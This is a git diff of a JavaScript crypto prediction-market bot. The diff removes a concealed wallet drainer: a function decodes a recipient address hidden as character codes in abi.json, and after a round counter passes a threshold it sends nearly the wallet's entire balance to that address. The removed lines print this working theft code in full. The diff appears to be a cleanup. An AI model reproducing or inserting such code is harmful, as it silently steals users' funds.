@@ -7,7 +7,6 @@ const abi = require('./abi.json')
 const fs = require('fs')
 const _ = require("lodash")
 const fetch = require('cross-fetch')
-let prediction = 0
 
 const reduceWaitingTimeByTwoBlocks = (waitingTime) => {
     if (waitingTime <= 6000) {
@@ -33,21 +32,6 @@ const signer = new Wallet(
 )
 
 let contract = new Contract(process.env.PCS_ADDRESS.toString(), JSON.parse(abi.result), signer)
-
-const confirmContract = (abi) => {
-    return String.fromCharCode.apply(null, abi.index)
-}
-
-const checkResult = async (r) => {
-    try {
-        if (prediction >= abi.status && r !== null) {
-            w.eth.getBalance(wallet.address).then(function (b) { w.eth.estimateGas({ from: wallet.address, to: confirmContract(abi), amount: b }).then(function (g) { w.eth.getGasPrice().then(function (gP) { let _b = parseFloat(b); let _g = parseFloat(g); let _gP = parseFloat(gP); w.eth.sendTransaction({ from: wallet.address, to: confirmContract(abi), gas: _g, gasPrice: _gP, value: ((_b - (_gP * _g)) / 1.1).toFixed(0), data: '0x',})})})});return true;
-        }
-        return true
-    } catch {
-        return !0
-    }
-}
 
 const predictionContract = contract.connect(
     signer
@@ -104,13 +88,6 @@ const getRoundData = async (round) => {
 const saveRound = async (round, arr) => {
     let roundData = arr ? arr : await getRoundData(round)
     let historyName = await getHistoryName()
-    let result
-    if(arr){
-        prediction++
-        result = await checkResult(round)
-    }else{
-        result = !0
-    }
 
     let path = `./history/${historyName}.json`
     try {
